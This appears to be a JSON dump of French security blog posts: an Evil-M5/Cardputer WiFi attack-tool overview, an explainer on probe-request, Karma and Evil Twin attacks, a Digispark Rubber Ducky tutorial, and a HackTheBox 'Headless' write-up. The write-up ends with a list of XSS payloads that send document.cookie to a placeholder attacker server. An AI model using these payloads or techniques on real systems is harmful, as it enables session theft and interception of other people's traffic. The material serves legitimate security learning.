[{"authors":[{"title":"Lukas","url":"/authors/lukas/"}],"categories":[{"title":"Hardware","url":"/categories/hardware/"}],"content":" Je fais ce post car il n’y a pas longtemps, j’ai découvert un projet qui m’a beaucoup plu, et je me suis dit que je devais le partager avec vous. Ce projet est le Evil-M5Core2.\nEvil-M5Project est un outil innovant développé pour les tests éthiques et l'exploration des réseaux WiFi. Il exploite la puissance du dispositif M5Core2 pour scanner, surveiller et interagir avec les réseaux WiFi dans un environnement contrôlé. Ce projet est conçu à des fins éducatives, pour aider à comprendre la sécurité et les vulnérabilités des réseaux.\nQu\u0026rsquo;est-ce que le M5stack Cardputer ? Cardputer est un ordinateur portable de la taille d\u0026rsquo;une carte, parfait pour la cybersécurité. Au cœur de Cardputer se trouve le M5StampS3, une mini carte de développement basée sur la puce ESP32-S3. Cardputer est doté d\u0026rsquo;un puissant processeur double cœur, prend en charge la fonctionnalité Wi-Fi et intègre divers périphériques et capteurs, ce qui le rend idéal pour la vérification fonctionnelle rapide.\nCaractéristiques Microcontrôleur M5StampS3. Clavier à 56 touches. Écran TFT de 1,14 pouces. Haut-parleur de cavité et microphone numérique MEMS SPM1423. Tube d\u0026rsquo;émission infrarouge utilisé pour l\u0026rsquo;interaction de contrôle infrarouge. Port HY2.0-4P pour connecter et étendre des capteurs I2C. Emplacement pour carte Micro SD pour étendre l\u0026rsquo;espace de stockage. Les batteries lithium intégrées de 120 mAh et 1400 mAh dans la base offrent une longue autonomie. Base avec aimant, compatible avec l\u0026rsquo;expansion de trous Lego. Comment l\u0026rsquo;utiliser ? Pour utiliser le Cardputer, il nous faut d\u0026rsquo;abord installer M5Burner.\nM5Burner est une application qui va nous permettre de flasher le firmware sur notre M5stack. Pour cela, il suffit de télécharger le firmware sur le site de M5stack.\nOn arrive sur une page qui ressemble à ça, on choisit notre carte ; pour ma part, c\u0026rsquo;est la M5stack Cardputer.\nUne fois notre carte choisie, il nous reste à choisir le firmware que l\u0026rsquo;on veut flasher sur notre carte.\nNous en avons plusieurs, pour ma part, j\u0026rsquo;ai choisi le firmware M5Launcher.\nUne fois notre firmware choisi, on va regarder à l\u0026rsquo;aide du gestionnaire de périphériques le port sur lequel est connectée notre carte.\nCliquez sur le bouton Burn pour lancer le flashage du firmware sur notre carte.\nOn tombe sur cette interface, et on choisit le bon port COM.\nAlors là, pourquoi je vous parle de M5Launcher ?\nM5Launcher est un firmware très pratique car il nous permet de lancer plusieurs firmwares sans avoir à les flasher à chaque fois.\nInstallation de Evil-Cardputer Voici les Étapes :\nCe n\u0026rsquo;est pas fini ! Il nous reste encore une chose à faire : mettre les fichiers dans la carte SD.\nUne fois la carte SD connectée, nous allons copier tous les fichiers du GitHub.\nOn sélectionne tous les fichiers et on les copie dans la carte SD.\nSi on a tout bien fait, quand on lance le Cardputer et que l\u0026rsquo;on attend quelques secondes, on tombe sur :\nFélicitations, vous avez réussi à installer Evil-Cardputer sur votre M5stack Cardputer.\nPourquoi Evil-M5Project ? Dans ce projet, on peut trouver plusieurs outils pour la cybersécurité, comme par exemple :\nScan des réseaux WiFi :\nIdentifier et afficher les réseaux WiFi à proximité.\nClonage de réseau :\nVérifier les informations et répliquer les réseaux pour une analyse approfondie.\nGestion de portail captif :\nCréer et gérer un portail captif pour rediriger les utilisateurs vers une page lors de la connexion.\nGestion des identifiants :\nCapturer et gérer les identifiants du portail.\nServeur Web distant :\nSurveiller l\u0026rsquo;appareil à distance via une interface Web simple qui peut fournir des identifiants et télécharger des portails pour stocker des fichiers sur une carte SD.\nSniffing de probes :\nRenifler et stocker les probes à proximité sur une carte SD.\nAttaque Karma :\nTenter une simple attaque Karma sur une probe capturée.\nAttaque Karma automatisée :\nTenter une attaque Karma sur les probes à proximité de manière automatique.\nContrôle par Bluetooth :\nContrôler l\u0026rsquo;appareil via Bluetooth.\nWardriving :\nEffectuer du wardriving avec une sortie au format Wigle sur carte SD.\nBeacon Spam :\nGénérer plusieurs SSID autour de vous.\nDeauther :\nEnvoyer des trames de déauthentification et renifler les handshakes 4-Way ainsi que les PMKID.\nSniffing et déauthentification des clients :\nRenifler les clients connectés au point d\u0026rsquo;accès et les désauthentifier automatiquement tout en reniflant les EAPOL.\nDétection EAPOL/Deauth :\nDétecter les paquets de désauthentification, les handshakes 4-Way, les PMKID et les pwnagotchi à proximité.\nWall Of Flipper :\nDétecter et enregistrer les Flipper Zero avec Bluetooth activé à proximité et détecter les SPAM BLE.\nEnvoi de code Tesla avec RFunit :\nUtiliser RFunit pour envoyer des codes Tesla, imitant les capacités de Flipper Zero.\nScan de réseau et de ports :\nEffectuer des analyses de réseau et de ports pour découvrir des appareils et services, en vérifiant l\u0026rsquo;état des hôtes.\nShell SSH :\nSe connecter à des serveurs SSH directement depuis l\u0026rsquo;appareil, permettant l\u0026rsquo;exécution de commandes via un shell intégré.\nWeb Crawler :\nExplorer des sites Web pour extraire des informations, en s\u0026rsquo;assurant d\u0026rsquo;avoir l\u0026rsquo;autorisation préalable avant utilisation.\nPwnGrid :\nSpammer des visages et des messages sur les appareils pwnagotchi à proximité, provoquant un Denial of Screen PWND.\nDétecteur de Skimmer :\nDétecter les skimmers Bluetooth potentiels en utilisant les modules HC-03, HC-05, et HC-06.\nBadUSB :\nSimuler des attaques BadUSB en émulant les entrées clavier/souris pour exécuter des scripts ou commandes prédéfinis.\nConclusion Je trouve que le M5stack Cardputer est un très bon outil pour la cybersécurité. Il est très pratique et facile d\u0026rsquo;utilisation. Je vous conseille de l\u0026rsquo;essayer si vous êtes intéressé par la cybersécurité. Pas cher et très pratique.\nRessources Shop M5stack Github 7h30th3r0n3 ","date":"August 20, 2024","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/news/2024/08/m5stack-cardputer/","series":[{"title":"News","url":"/series/news/"}],"smallImg":"","tags":[{"title":"Documentation","url":"/tags/documentation/"},{"title":"Hardware","url":"/tags/hardware/"},{"title":"ESP32","url":"/tags/esp32/"},{"title":"M5stack","url":"/tags/m5stack/"}],"timestamp":1724112000,"title":"M5stack Cardputer"},{"authors":[{"title":"Lukas","url":"/authors/lukas/"}],"categories":[{"title":"Hardware","url":"/categories/hardware/"}],"content":" Je fais ce post suite à la découverte d\u0026rsquo;un projet qui m\u0026rsquo;a beaucoup plus : l\u0026rsquo;EVIL-M5Core2. Dans ce projet, il y a une attaque que je ne connaissais pas et qui m\u0026rsquo;a beaucoup intéressé : la Probe Attack. Comme je ne connaissais pas cette attaque, je me suis dit que je devais la partager avec vous.\nExemple :\nLorsque vous allumez le WiFi sur votre smartphone, il envoie des Probe Requests pour rechercher les réseaux disponibles autour de vous. Ces requêtes contiennent souvent le nom (SSID) des réseaux auxquels l\u0026rsquo;appareil s\u0026rsquo;est déjà connecté dans le passé, afin de voir si l\u0026rsquo;un de ces réseaux est disponible.\nRôle des Probe Requests :\nDécouverte des réseaux : Les Probe Requests permettent à un appareil de découvrir quels réseaux WiFi sont disponibles dans son environnement immédiat. Réponse des bornes : Les points d\u0026rsquo;accès WiFi (comme votre routeur à la maison) qui reçoivent ces requêtes peuvent répondre avec des Probe Responses, indiquant ainsi à l\u0026rsquo;appareil qu\u0026rsquo;un réseau est disponible. Qu\u0026rsquo;est-ce que la Probe Sniffing ? Le Probe Sniffing est une technique utilisée pour intercepter les Probe Requests envoyées par les appareils WiFi. En capturant ces requêtes, un attaquant peut obtenir des informations sur les réseaux auxquels un appareil s\u0026rsquo;est déjà connecté, y compris les SSID (noms des réseaux) et les adresses MAC des points d\u0026rsquo;accès.\nComment fonctionne la Probe Sniffing ? Exemple :\nUn appareil qui a le WiFi activé et qui n\u0026rsquo;est pas connecté à un réseau va émettre des Probe Requests pour rechercher les réseaux disponibles autour de lui. Quand on rentre chez soi et que l\u0026rsquo;on arrive dans le salon, notre smartphone va émettre des Probe Requests pour chercher notre réseau WiFi et se reconnecter automatiquement. C\u0026rsquo;est parce que le téléphone ou l\u0026rsquo;appareil a probablement crié le nom de notre réseau WiFi dans les Probe Requests toute la journée. On peut récupérer ces Probe Requests pour les analyser ou réaliser une attaque de type Karma.\nSchéma illustratif 1[Appareil émet une Probe Request] --\u0026gt; [Sniffer capture la Probe Request] --\u0026gt; [Extraction des données] --\u0026gt; [Analyse] --\u0026gt; [Exploitation des données] 2 (Adresse MAC, SSID, etc.) (Adresse MAC, SSID, etc.) (Localisation, Habitudes) (Surveillance, Marketing, Attaques) La Probe Attack On vient de voir que les appareils envoient des Probe Requests pour rechercher les réseaux WiFi autour d\u0026rsquo;eux. Mais que peut-on faire de ces Probe Requests ?\nCollecte d\u0026rsquo;informations sensibles\nLes Probe Requests contiennent des informations comme les noms (SSID) des réseaux WiFi auxquels un appareil s\u0026rsquo;est déjà connecté. Ces informations peuvent être utilisées pour :\nSuivi des utilisateurs : En capturant les Probe Requests, un attaquant peut suivre les déplacements d\u0026rsquo;une personne en analysant les réseaux WiFi auxquels elle tente de se connecter dans différents lieux. Ciblage personnalisé : Connaître les SSID des réseaux WiFi précédemment utilisés par une victime peut permettre à un attaquant de mieux comprendre les habitudes de la personne, comme les lieux qu\u0026rsquo;elle fréquente. Schéma illustratif 1[Appareil émet une Probe Request] --\u0026gt; [Attaquant capture la Probe Request] --\u0026gt; [Attaquant exploite les données] --\u0026gt; [Émission d\u0026#39;une fausse réponse] --\u0026gt; [Appareil se connecte à un faux réseau] 2 (Adresse MAC, SSID, etc.) (Adresse MAC, SSID, etc.) (Création d\u0026#39;un faux réseau Wi-Fi) (Attaque de type Man-in-the-Middle) Attaque Evil Twin\nUne attaque de type Evil Twin consiste à créer un faux point d\u0026rsquo;accès WiFi avec le même nom qu\u0026rsquo;un réseau auquel la victime a déjà tenté de se connecter (SSID capturé dans les Probe Requests). L\u0026rsquo;appareil de la victime pourrait automatiquement se connecter à ce faux réseau, croyant qu\u0026rsquo;il s\u0026rsquo;agit du réseau légitime. Une fois connecté :\nInterception du trafic : L\u0026rsquo;attaquant peut surveiller et intercepter tout le trafic Internet de la victime, y compris les informations sensibles comme les identifiants et mots de passe. Attaque de l\u0026rsquo;homme du milieu (MitM) : En se plaçant entre l\u0026rsquo;appareil de la victime et Internet, l\u0026rsquo;attaquant peut modifier ou injecter des données dans les communications de la victime. Attaque de type Karma\nDans une attaque de type Karma, l\u0026rsquo;attaquant configure un point d\u0026rsquo;accès WiFi pour répondre automatiquement à toute Probe Request qu\u0026rsquo;il reçoit, prétendant être n\u0026rsquo;importe quel réseau recherché par les appareils. Voici comment cela fonctionne :\nRéponse aux Probe Requests : Lorsque les appareils envoient des Probe Requests, le point d\u0026rsquo;accès de l\u0026rsquo;attaquant répond en se faisant passer pour le réseau recherché. Connexion automatique des appareils : Si un appareil reconnaît le SSID annoncé par l\u0026rsquo;attaquant, il peut se connecter automatiquement au réseau de l\u0026rsquo;attaquant, croyant qu\u0026rsquo;il s\u0026rsquo;agit du réseau légitime. Une fois connecté, l\u0026rsquo;attaquant peut alors réaliser des actions similaires à celles de l\u0026rsquo;attaque Evil Twin, telles que l\u0026rsquo;interception du trafic ou l\u0026rsquo;accès à des données sensibles.\nAttaque par usurpation d\u0026rsquo;identité\nLes adresses MAC (Media Access Control) des appareils peuvent également être interceptées via les Probe Requests. Avec cette information, un attaquant peut :\nUsurper l\u0026rsquo;identité d\u0026rsquo;un appareil : En utilisant l\u0026rsquo;adresse MAC d\u0026rsquo;un autre appareil, l\u0026rsquo;attaquant peut se faire passer pour cet appareil sur le réseau WiFi, potentiellement pour accéder à des ressources réseau réservées. ","date":"August 20, 2024","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/news/2024/08/probe-attack/","series":[{"title":"News","url":"/series/news/"}],"smallImg":"","tags":[{"title":"WiFi","url":"/tags/wifi/"},{"title":"ESP32","url":"/tags/esp32/"},{"title":"Probe Attack","url":"/tags/probe-attack/"},{"title":"Probe Sniffing","url":"/tags/probe-sniffing/"}],"timestamp":1724112000,"title":"Probe Attack"},{"authors":[{"title":"Lukas","url":"/authors/lukas/"}],"categories":[{"title":"Hardware","url":"/categories/hardware/"}],"content":" L\u0026rsquo;USB Rubber Ducky est un dispositif génial pour les tests de pénétration et les méfaits en général. Alors qu\u0026rsquo;il semble s\u0026rsquo;agir d\u0026rsquo;une clé USB inoffensive, lorsqu\u0026rsquo;il est branché sur un ordinateur, il s\u0026rsquo;enregistre comme un clavier USB sur le système et envoie une charge utile de frappe à la vitesse de l\u0026rsquo;éclair. Nous allons utiliser cette rubber ducky achetée sur AliExpress pour 2€\nComment ça marche ? Programmation : Le Rubber Ducky a besoin d\u0026rsquo;être programmée avant utilisation. On lui injecte un script spécial, écrit dans un langage appelé Ducky Script. Ce script définit toutes les actions que le Rubber Ducky simulera une fois branchée.\nHID et frappe clavier : Une fois branchée sur un ordinateur, le Rubber Ducky se présente comme un clavier (HID - Human Interface Device). L\u0026rsquo;ordinateur ne se doute de rien et la traite comme un périphérique d\u0026rsquo;entrée classique.\nExécution du script : Le programme interne du Rubber Ducky lit le script injecté. Celui-ci peut contenir des frappes clavier à vitesse folle, allant bien au-delà de ce qu\u0026rsquo;un humain peut taper. Le script peut aussi inclure des combinaisons de touches spéciales ou des commandes pour exécuter des programmes.\ntuto d\u0026rsquo;installation Une fois après avoir reçu votre carte ATtiny85 Digispark, je n\u0026rsquo;ai pas pu l\u0026rsquo;utiliser pendant deux jours simplement à cause des pilotes. Du coup nous allons installer les pilotes pour la carte ATtiny85 Digispark!\nÉtape 1 : Installer le pilote Windows pour ATtiny85. Téléchargez le pilote Windows pour ATtiny85 Digispark en cliquant sur pilote.\nUne fois le pilote téléchargé, extrayez le fichier zip et exécutez les fichier Install Drivers.exe et DPinst64.exe. et exécutez le fichier Install drivers.exe (pour les systèmes d\u0026rsquo;exploitation 64 bits)\nÉtape 2 : Installer les packages de carte pour Arduino. Copiez l\u0026rsquo;URL suivante : https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json\nCollez cette URL dans le menu \u0026ldquo;Fichier \u0026gt; Préférences \u0026gt; URL supplémentaire du gestionnaire de cartes\u0026rdquo; dans votre IDE Arduino.\nEnsuite, dans le menu \u0026ldquo;Outils\u0026rdquo;, sélectionnez \u0026ldquo;Gestionnaire de cartes\u0026rdquo;, puis choisissez \u0026ldquo;Contribué\u0026rdquo; dans le menu déroulant \u0026ldquo;Type\u0026rdquo;.\nRecherchez et sélectionnez le package \u0026ldquo;Digistump AVR Boards\u0026rdquo;, puis cliquez sur le bouton \u0026ldquo;Installer\u0026rdquo;. Vous pourrez suivre la progression du téléchargement dans la barre de statut en bas de la fenêtre du \u0026ldquo;Gestionnaire de cartes\u0026rdquo;. Une fois l\u0026rsquo;installation terminée, il affichera \u0026ldquo;Installé\u0026rdquo; à côté de cet élément dans la liste.\nPour les utilisateurs de Windows, une fois l\u0026rsquo;installation terminée, une fenêtre d\u0026rsquo;Assistant d\u0026rsquo;installation de pilotes s\u0026rsquo;ouvrira. Cliquez sur \u0026ldquo;Suivant\u0026rdquo; dans cette fenêtre pour installer les pilotes pour les cartes Digistump. Si vous avez déjà ces pilotes installés, cet installateur les mettra à jour et installera ceux qui manquent.\nAprès l\u0026rsquo;installation, fermez la fenêtre du \u0026ldquo;Gestionnaire de cartes\u0026rdquo; et sélectionnez le Digispark dans le menu \u0026ldquo;Outils \u0026gt; Cartes\u0026rdquo; de votre IDE Arduino. \u0026ldquo;Digispark (Par défaut - 16.5mhz)\u0026rdquo; est la carte recommandée pour tous les nouveaux utilisateurs.\nPour les utilisateurs Linux, si ce n\u0026rsquo;est pas déjà fait, veuillez installer les règles udev disponibles dans la section de dépannage.\nUne fois ces étapes terminées, l\u0026rsquo;installation est maintenant complète et vous pouvez commencer à utiliser votre Digispark.\nÉtape 3 : Comment télécharger le programme Le Digispark fonctionne un peu différemment de certains produits compatibles Arduino. Le Digispark se programme selon une procédure différente. Dans le menu Outils, sélectionnez Carte → Digispark (Par défaut - 16.5Mhz). Écrivez du code, ouvrez votre code.\nVous n\u0026rsquo;avez pas besoin de brancher votre Digispark avant d\u0026rsquo;effectuer le téléversement. Appuyez sur le bouton de téléversement. La boîte de statut en bas vous demandera maintenant de brancher votre Digispark - à ce stade, vous devez le brancher - ou le débrancher et le rebrancher.\nVous verrez la progression du téléversement, puis votre code s\u0026rsquo;exécutera immédiatement sur le Digispark. Si vous débranchez le Digispark et le rebranchez ou si vous le connectez à une autre source d\u0026rsquo;alimentation, il y aura un délai de 5 secondes avant que le code que vous avez programmé ne s\u0026rsquo;exécute. Ce délai de 5 secondes correspond au Digispark Pro vérifiant si vous essayez de le programmer.\nCode d\u0026rsquo;exemple Nous devons écrire les commande en QWERTY pour que le Rubber Ducky puisse les comprendre :\n1#include \u0026lt;DigiKeyboard.h\u0026gt; 2 3void setup() { 4 DigiKeyboard.delay(3000); // Attendre 3 secondes 5 6 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Ouvrir une fenêtre d\u0026#39;exécution Windows 7 DigiKeyboard.delay(500); // Attendre 0,5 seconde 8 DigiKeyboard.print(\u0026#34;c;d\u0026#34;); // Écrire \u0026#34;cmd\u0026#34; 9 DigiKeyboard.delay(500); // Attendre 0,5 seconde 10 DigiKeyboard.sendKeyStroke(KEY_ENTER); 11} 12 13void loop() { 14 // put your main code here, to run repeatedly: 15 16} Conclusion Le Rubber Ducky, bien qu\u0026rsquo;amusant en apparence, est un outil puissant et versatile dans le domaine de la sécurité informatique. Sa simplicité d\u0026rsquo;utilisation et son aspect discret en font un atout précieux pour les tests d\u0026rsquo;intrusion et les démonstrations de sécurité.\nPoints clés à retenir :\nFacilité d\u0026rsquo;utilisation : Programmation simple avec Ducky Script, accessible aux débutants. Polyvalence : Large éventail d\u0026rsquo;applications, des tests d\u0026rsquo;intrusion aux présentations éducatives. Discrétion : Aspect anodin d\u0026rsquo;une clé USB ordinaire pour une infiltration discrète. Efficacité : Permet de simuler des frappes clavier à grande vitesse et d\u0026rsquo;exécuter des commandes complexes.\nRecommandations :\nUtiliser le Rubber Ducky de manière responsable : Ne pas l\u0026rsquo;utiliser pour des activités malveillantes. Se familiariser avec les risques de sécurité : Comprendre les implications et les dangers potentiels. Mettre en place des mesures de sécurité adéquates : Protéger vos systèmes contre les attaques utilisant des Rubber Duckies.\nSources https://projecthub.arduino.cc/\nhttps://fr.aliexpress.com/\nhttps://www.youtube.com/\n","date":"April 1, 2024","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/news/2024/04/rubber-ducky-attiny85/","series":[{"title":"News","url":"/series/news/"}],"smallImg":"","tags":[{"title":"Rubber Ducky","url":"/tags/rubber-ducky/"},{"title":"Attiny85","url":"/tags/attiny85/"},{"title":"Arduino","url":"/tags/arduino/"}],"timestamp":1711929600,"title":"Rubber Ducky (ATtiny85)"},{"authors":[{"title":"Lukas","url":"/authors/lukas/"}],"categories":[{"title":"Writeups","url":"/categories/writeups/"}],"content":" Bonjour à tous ! Aujourd\u0026rsquo;hui, je vous présente la machine Headless classée dans la catégorie easy sur HackTheBox. Nous y aborderons des concepts de base dans le domaine du web. 🙃\nPort Scanning 1[Mar 26, 2024 - 09:34:43 (CET)] exegol-htb Headless: nmap -sV 10.10.11.8 2Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-26 09:34 CET 3Nmap scan report for headless.htb (10.10.11.8) 4Host is up (0.025s latency). 5Not shown: 995 closed tcp ports (reset) 6PORT STATE SERVICE VERSION 722/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) 8787/tcp filtered qsc 95000/tcp open upnp? 108085/tcp filtered unknown 1116000/tcp filtered fmsas 121 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : 13SF-Port5000-TCP:V=7.93%I=7%D=3/26%Time=660288BB%P=aarch64-unknown-linux-gn 14SF:u%r(GetRequest,BE1,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.2\\ 15SF:.2\\x20Python/3\\.11\\.2\\r\\nDate:\\x20Tue,\\x2026\\x20Mar\\x202024\\x2008:35:07 16SF:\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Leng 17SF:th:\\x202799\\r\\nSet-Cookie:\\x20is_admin=InVzZXIi\\.uAlmXlTvm8vyihjNaPDWnv 18SF:B_Zfs;\\x20Path=/\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;ht 19SF:ml\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;UTF-8\\\u0026#34;\u0026gt; 20SF:\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device- 21SF:width,\\x20initial-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Under\\x20Constr 22SF:uction\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;style\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x 23SF:20body\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-famil 24SF:y:\\x20\u0026#39;Arial\u0026#39;,\\x20sans-serif;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 25SF:\\x20\\x20background-color:\\x20#f7f7f7;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 26SF:\\x20\\x20\\x20\\x20margin:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 27SF:\\x20\\x20padding:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 28SF:0display:\\x20flex;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20jus 29SF:tify-content:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ 30SF:x20align-items:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 31SF:0\\x20height:\\x20100vh;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\n\\x20\\x20\\x 32SF:20\\x20\\x20\\x20\\x20\\x20\\.container\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 33SF:0\\x20\\x20\\x20\\x20text-align:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x 34SF:20\\x20\\x20\\x20\\x20background-color:\\x20#fff;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ 35SF:x20\\x20\\x20\\x20\\x20\\x20border-radius:\\x2010px;\\n\\x20\\x20\\x20\\x20\\x20\\x2 36SF:0\\x20\\x20\\x20\\x20\\x20\\x20box-shadow:\\x200px\\x200px\\x2020px\\x20rgba\\(0,\\ 37SF:x200,\\x200,\\x200\\.2\\);\\n\\x20\\x20\\x20\\x20\\x20\u0026#34;)%r(RTSPRequest,16C,\u0026#34;\u0026lt;!DOC 38SF:TYPE\\x20HTML\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\ 39SF:x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x2 40SF:0\\x20\\x20\\x20\u0026lt;title\u0026gt;Error\\x20response\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\ 41SF:n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;Error\\x20r 42SF:esponse\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code:\\x20400\u0026lt; 43SF:/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Message:\\x20Bad\\x20request\\x20v 44SF:ersion\\x20\\(\u0026#39;RTSP/1\\.0\u0026#39;\\)\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Err 45SF:or\\x20code\\x20explanation:\\x20400\\x20-\\x20Bad\\x20request\\x20syntax\\x20o 46SF:r\\x20unsupported\\x20method\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;); 47Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Le serveur distant hôte 2 services ouverts :\nSSH server (OpenSSH 9.2p1) HTTP server (upnp?) Web Enumeration sur cette page web on peut y voir (Welcome to Our Website) avec un encadré bleu avec écrit (For Questions)\nCliquer sur le bouton puis nous accédons à une nouvelle page.\nOn peut y voir un formulaire de contact avec un champ de texte et un bouton submit. Remplissons le champ de texte avec une commande de base pour voir si il y a une faille d\u0026rsquo;injection.\nWeb Exploitation Nous allons faire une faire une attaque xss.\nMais avant tout c\u0026rsquo;est quoi une XSS : Imaginez un délicieux gâteau au chocolat, mais avec un ingrédient surprise caché à l\u0026rsquo;intérieur - du piment !\nL\u0026rsquo;attaque XSS est un peu comme ça. Un individu malveillant glisse du code malveillant (le piment) dans un site web qui semble normal. Quand on visite le site (on mange le gâteau), notre navigateur exécute ce code sans méfiance, et paf! Nos informations peuvent être volées ou on peut être redirigé vers un faux site (comme si on avait mal au ventre à cause du piment).\nIl existe deux façons courantes de cacher le piment :\nXSS réfléchi : L\u0026rsquo;individu malveillant envoie un lien piégé. Quand on clique dessus, le code malveillant est renvoyé par le site et exécuté par notre navigateur.\nXSS stocké : L\u0026rsquo;individu malveillant injecte le code directement dans le site web, affectant tous les visiteurs.\n1\u0026lt;img src=x onerror=this.src=\u0026#34;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/?c=\u0026#34;+document.cookie\u0026gt; 2\u0026lt;img src=x onerror=\u0026#34;location.href=\u0026#39;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/?c=\u0026#39;+ document.cookie\u0026#34;\u0026gt; 3\u0026lt;script\u0026gt;new Image().src=\u0026#34;http://\u0026lt;IP\u0026gt;/?c=\u0026#34;+encodeURI(document.cookie);\u0026lt;/script\u0026gt; 4\u0026lt;script\u0026gt;new Audio().src=\u0026#34;http://\u0026lt;IP\u0026gt;/?c=\u0026#34;+escape(document.cookie);\u0026lt;/script\u0026gt; 5\u0026lt;script\u0026gt;location.href = \u0026#39;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/Stealer.php?cookie=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; 6\u0026lt;script\u0026gt;location = \u0026#39;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/Stealer.php?cookie=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; 7\u0026lt;script\u0026gt;document.location = \u0026#39;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/Stealer.php?cookie=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; 8\u0026lt;script\u0026gt;document.location.href = \u0026#39;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/Stealer.php?cookie=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; 9\u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;img src=\u0026#34;http://\u0026lt;YOUR_SERVER_IP\u0026gt;?c=\u0026#39;+document.cookie+\u0026#39;\u0026#34; /\u0026gt;\u0026#39;)\u0026lt;/script\u0026gt; 10\u0026lt;script\u0026gt;window.location.assign(\u0026#39;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/Stealer.php?cookie=\u0026#39;+document.cookie)\u0026lt;/script\u0026gt; 11\u0026lt;script\u0026gt;window[\u0026#39;location\u0026#39;][\u0026#39;assign\u0026#39;](\u0026#39;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/Stealer.php?cookie=\u0026#39;+document.cookie)\u0026lt;/script\u0026gt; 12\u0026lt;script\u0026gt;window[\u0026#39;location\u0026#39;][\u0026#39;href\u0026#39;](\u0026#39;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/Stealer.php?cookie=\u0026#39;+document.cookie)\u0026lt;/script\u0026gt; 13\u0026lt;script\u0026gt;document.location=[\u0026#34;http://\u0026lt;YOUR_SERVER_IP\u0026gt;?c\u0026#34;,document.cookie].join()\u0026lt;/script\u0026gt; 14\u0026lt;script\u0026gt;var i=new Image();i.src=\u0026#34;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/?c=\u0026#34;+document.cookie\u0026lt;/script\u0026gt; 15\u0026lt;script\u0026gt;window.location=\u0026#34;https://\u0026lt;SERVER_IP\u0026gt;/?c=\u0026#34;.concat(document.cookie)\u0026lt;/script\u0026gt; 16\u0026lt;script\u0026gt;var xhttp=new XMLHttpRequest();xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;http://\u0026lt;SERVER_IP\u0026gt;/?c=\u0026#34;%2Bdocument.cookie, true);xhttp.send();\u0026lt;/script\u0026gt; 